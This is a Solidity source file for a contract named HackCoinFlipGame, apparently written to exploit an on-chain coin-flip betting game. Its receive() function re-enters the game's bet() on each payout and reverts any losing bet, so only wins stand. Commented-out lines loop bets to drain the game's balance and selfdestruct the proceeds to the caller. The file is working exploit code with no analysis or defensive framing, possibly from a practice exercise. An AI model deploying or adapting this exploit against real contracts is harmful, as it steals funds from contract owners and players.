pragma solidity ^0.6.0;

interface Interface {
    function bet() external payable;
    function maxBet() external view returns(uint256);
}

contract HackCoinFlipGame {
    address public coinFlipGameAddr;

    constructor() public payable {}

    function hack(address addr) public payable{
        coinFlipGameAddr = addr;
        uint256 initialBalance = address(this).balance;

        Interface cfg = Interface(coinFlipGameAddr);
        cfg.bet.value(cfg.maxBet())();
        
        // if(address(this).balance < initialBalance) {
        //     revert("Did not win");
        // }
        
        // while(coinFlipGameAddr.balance > 1000000000 wei) {
        //     // cfg.bet.value(100000000 wei)();
        //     cfg.bet.value(cfg.maxBet())();
        // }

        // selfdestruct(msg.sender);
    }
    
    function balance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function maxBet() public view returns(uint256) {
        Interface cfg = Interface(coinFlipGameAddr);
        return cfg.maxBet();
    }

    receive() external payable {
        // uint256 balance = coinFlipGameAddr.balance;
        // if (balance == 0) return;
        // if (balance > 1 wei) balance = 1 wei;
        uint256 initialBalance = address(this).balance;
        Interface cfg = Interface(coinFlipGameAddr);
        cfg.bet.value(cfg.maxBet())();
        // while(coinFlipGameAddr.balance > 1000000000 wei) {
        //     // cfg.bet.value(100000000 wei)();
        //     cfg.bet.value(cfg.maxBet())();
        // }
        
        if(address(this).balance < initialBalance) {
            revert("Did not win");
        }
    }
}